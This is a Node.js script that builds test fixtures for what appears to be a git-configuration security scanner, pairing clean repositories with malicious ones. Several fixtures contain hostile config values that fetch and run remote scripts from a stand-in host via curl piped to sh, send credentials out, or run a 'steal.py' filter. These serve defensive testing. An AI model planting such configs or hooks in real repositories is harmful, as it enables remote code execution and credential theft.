// Regenerates the fixture repositories used by the test suite.
// The fixtures are code, not hand-maintained files: run `npm test` and they are rebuilt.
import { mkdir, writeFile, rm } from 'node:fs/promises';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const CLEAN = path.join(__dirname, 'clean');
const VULN = path.join(__dirname, 'vulnerable');

async function repo(base, name, { config = '[core]\n\trepositoryformatversion = 0\n', hooks = {}, extra = {} } = {}) {
  const root = path.join(base, name);
  const gitDir = path.join(root, '.git');
  await mkdir(path.join(gitDir, 'hooks'), { recursive: true });
  await writeFile(path.join(gitDir, 'config'), config, 'utf-8');
  await writeFile(path.join(gitDir, 'hooks', 'pre-commit.sample'), '#!/bin/sh\n# sample\n', 'utf-8');
  for (const [n, c] of Object.entries(hooks)) await writeFile(path.join(gitDir, 'hooks', n), c, 'utf-8');
  for (const [rel, c] of Object.entries(extra)) {
    const p = path.join(root, rel);
    await mkdir(path.dirname(p), { recursive: true });
    await writeFile(p, c, 'utf-8');
  }
  return root;
}

const CLEAN_FIXTURES = {
  'minimal': '[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tbare = false\n',
  'with-remote': '[core]\n\trepositoryformatversion = 0\n[remote "origin"]\n\turl = https://github.com/example/repo.git\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n',
  'fsmonitor-true': '[core]\n\tfsmonitor = true\n',
  'fsmonitor-false': '[core]\n\tfsmonitor = false\n',
  'pager-less': '[core]\n\tpager = less\n',
  'pager-delta': '[core]\n\tpager = delta\n[interactive]\n\tdiffFilter = delta --color-only\n',
  'pager-bat': '[core]\n\tpager = bat --style=plain\n',
  'editor-vim': '[core]\n\teditor = vim\n',
  'editor-vscode': '[core]\n\teditor = code --wait\n',
  'editor-nvim': '[core]\n\teditor = nvim\n[sequence]\n\teditor = nvim\n',
  'with-user': '[user]\n\tname = Jane Developer\n\temail = jane@example.com\n[core]\n\tautocrlf = input\n',
  'with-aliases': '[alias]\n\tco = checkout\n\tst = status\n\tlg = log --oneline --graph --decorate\n\tunstage = reset HEAD --\n',
  'branch-tracking': '[branch "main"]\n\tremote = origin\n\tmerge = refs/heads/main\n',
  'multiple-remotes': '[remote "origin"]\n\turl = git@github.com:example/repo.git\n[remote "upstream"]\n\turl = https://github.com/upstream/repo.git\n',
  'git-lfs': '[filter "lfs"]\n\tclean = git-lfs clean -- %f\n\tsmudge = git-lfs smudge -- %f\n\tprocess = git-lfs filter-process\n\trequired = true\n',
  'diff-tool-names': '[diff]\n\ttool = vimdiff\n[merge]\n\ttool = vimdiff\n\tconflictstyle = diff3\n',
  'color-config': '[color]\n\tui = auto\n[color "branch"]\n\tcurrent = yellow reverse\n',
  'push-config': '[push]\n\tdefault = simple\n\tautoSetupRemote = true\n',
  'pull-rebase': '[pull]\n\trebase = true\n[rebase]\n\tautoStash = true\n',
  'init-defaultbranch': '[init]\n\tdefaultBranch = main\n',
  'credential-osxkeychain': '[credential]\n\thelper = osxkeychain\n',
  'credential-manager': '[credential]\n\thelper = manager-core\n',
  'gpg-signing': '[commit]\n\tgpgsign = true\n[gpg]\n\tprogram = gpg\n[user]\n\tsigningkey = ABC123\n',
  'comments-and-quotes': '# project config\n[core]\n\trepositoryformatversion = 0 ; trailing comment\n\texcludesfile = .gitignore\n[core]\n\tfsmonitor = false\n',
  'sparse-checkout': '[core]\n\tsparseCheckout = true\n[extensions]\n\tworktreeConfig = true\n',
  'git-crypt-filter': '[filter "git-crypt"]\n\tsmudge = git-crypt smudge\n\tclean = git-crypt clean\n',
};

const VULN_FIXTURES = {
  'fsmonitor-script': { config: '[core]\n\tfsmonitor = /tmp/.cache/fsmonitor-helper.sh\n', expect: 'core-fsmonitor' },
  'fsmonitor-shell': { config: '[core]\n\tfsmonitor = "sh -c \'curl -s https://evil.example/p.sh | sh\'"\n', expect: 'core-fsmonitor' },
  'sshcommand-override': { config: '[core]\n\tsshCommand = /tmp/ssh-wrapper.sh\n', expect: 'core-sshcommand' },
  'gitproxy': { config: '[core]\n\tgitProxy = /tmp/proxy.sh\n', expect: 'core-gitproxy' },
  'hookspath-in-repo': { config: '[core]\n\thooksPath = .devtools/hooks\n', expect: 'core-hookspath' },
  'include-unreachable': { config: '[include]\n\tpath = .github/extra.gitconfig\n', expect: 'include-not-followed' },
  'includeif-outside-tree': { config: '[includeIf "gitdir:./"]\n\tpath = /etc/gitconfig-elsewhere\n', expect: 'include-not-followed' },
  'diff-external': { config: '[diff]\n\texternal = /tmp/diff-helper.sh\n', expect: 'diff-external' },
  'credential-helper-shell': { config: '[credential]\n\thelper = "!f() { curl -s https://evil.example/c?u=$1; }; f"\n', expect: 'credential-helper' },
  'alias-shell': { config: '[alias]\n\tst = !curl -s https://evil.example/x.sh | sh\n', expect: 'alias-shell' },
  'filter-clean-malicious': { config: '[filter "build"]\n\tclean = python3 .ci/steal.py\n\tsmudge = cat\n', expect: 'filter-driver' },
  'textconv-malicious': { config: '[diff "docx"]\n\ttextconv = /tmp/convert.sh\n', expect: 'diff-textconv' },
  'merge-driver-malicious': { config: '[merge "custom"]\n\tdriver = /tmp/merge.sh %O %A %B\n', expect: 'merge-driver' },
  'mergetool-cmd': { config: '[mergetool "evil"]\n\tcmd = /tmp/payload.sh\n', expect: 'tool-cmd' },
  'uploadpack-hook': { config: '[uploadpack]\n\tpackObjectsHook = /tmp/hook.sh\n', expect: 'uploadpack-hook' },
  'editor-script': { config: '[core]\n\teditor = /tmp/.hidden/editor.sh\n', expect: 'core-editor' },
  'pager-shell': { config: '[core]\n\tpager = "sh -c \'id > /tmp/pwned\'"\n', expect: 'core-pager' },
  'hook-fetches-remote': { config: '[core]\n\trepositoryformatversion = 0\n', hooks: { 'post-checkout': '#!/bin/sh\ncurl -s https://evil.example/p | sh\n' }, expect: 'hook-fetches-remote-code' },
  'active-unknown-hook': { config: '[core]\n\trepositoryformatversion = 0\n', hooks: { 'post-merge': '#!/bin/sh\ncp /etc/hosts /tmp/h\n' }, expect: 'active-hook' },
};

async function main() {
  await rm(CLEAN, { recursive: true, force: true });
  await rm(VULN, { recursive: true, force: true });
  await mkdir(CLEAN, { recursive: true });
  await mkdir(VULN, { recursive: true });

  for (const [name, config] of Object.entries(CLEAN_FIXTURES)) {
    await repo(CLEAN, name, { config });
  }

  // Clean edge case: husky, the most common hook manager in the Node ecosystem
  const husky = await repo(CLEAN, 'husky-project', {
    config: '[core]\n\thooksPath = .husky\n',
    hooks: { 'pre-commit': '#!/usr/bin/env sh\n. "$(dirname -- "$0")/_/husky.sh"\nnpm test\n' },
    extra: { '.husky/_/husky.sh': '#!/usr/bin/env sh\n# husky bootstrap\n', '.husky/pre-commit': '#!/usr/bin/env sh\nnpm test\n' },
  });
  void husky;

  // Clean edge case: the .githooks convention with an ordinary script
  await repo(CLEAN, 'githooks-convention', {
    config: '[core]\n\thooksPath = .githooks\n',
    extra: { '.githooks/pre-push': '#!/bin/sh\nnpm run lint\n' },
  });

  // Clean edge case: a properly registered submodule must not be reported as a nested .git
  const sub = await repo(CLEAN, 'registered-submodule', {
    config: '[core]\n\trepositoryformatversion = 0\n[submodule "vendor/lib"]\n\turl = https://github.com/example/lib.git\n',
    extra: { '.gitmodules': '[submodule "vendor/lib"]\n\tpath = vendor/lib\n\turl = https://github.com/example/lib.git\n' },
  });
  await mkdir(path.join(sub, 'vendor', 'lib', '.git', 'hooks'), { recursive: true });
  await writeFile(path.join(sub, 'vendor', 'lib', '.git', 'config'), '[core]\n\trepositoryformatversion = 0\n', 'utf-8');

  for (const [name, spec] of Object.entries(VULN_FIXTURES)) {
    await repo(VULN, name, { config: spec.config, hooks: spec.hooks });
  }

  // Vulnerable: an include that IS reachable, carrying the payload one file away
  const inc = await repo(VULN, 'include-payload', { config: '[include]\n\tpath = ../shared/build-flags.txt\n' });
  await mkdir(path.join(inc, 'shared'), { recursive: true });
  await writeFile(path.join(inc, 'shared', 'build-flags.txt'), '[core]\n\tfsmonitor = /tmp/payload.sh\n', 'utf-8');

  // Vulnerable: a repository-shipped hooks directory whose script pulls remote code
  await repo(VULN, 'hookspath-fetches-remote', {
    config: '[core]\n\thooksPath = .githooks\n',
    extra: { '.githooks/post-checkout': '#!/bin/sh\ncurl -s https://evil.example/p.sh | sh\n' },
  });

  // Structural vulnerable case 1: a bare repository hidden in the tree (CVE-2026-45033 vector)
  const bareHost = await repo(VULN, 'bare-repo-in-tree');
  const bare = path.join(bareHost, 'vendor', 'payload.git');
  await mkdir(path.join(bare, 'objects'), { recursive: true });
  await mkdir(path.join(bare, 'refs'), { recursive: true });
  await writeFile(path.join(bare, 'HEAD'), 'ref: refs/heads/main\n', 'utf-8');
  await writeFile(path.join(bare, 'config'), '[core]\n\tbare = true\n\tfsmonitor = /tmp/.x/run.sh\n', 'utf-8');

  // Structural vulnerable case 2: an unregistered nested .git that arrived as content
  const nestHost = await repo(VULN, 'nested-git-dir');
  await mkdir(path.join(nestHost, 'examples', 'demo', '.git', 'hooks'), { recursive: true });
  await writeFile(path.join(nestHost, 'examples', 'demo', '.git', 'config'), '[core]\n\tfsmonitor = ./run.sh\n', 'utf-8');

  const cleanCount = Object.keys(CLEAN_FIXTURES).length + 3;
  const vulnCount = Object.keys(VULN_FIXTURES).length + 4;
  console.log(`fixtures: ${cleanCount} clean, ${vulnCount} vulnerable`);
}

import { pathToFileURL } from 'node:url';
if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) {
  await main();
}

export const EXPECTATIONS = Object.fromEntries(
  Object.entries(VULN_FIXTURES).map(([name, spec]) => [name, spec.expect])
);
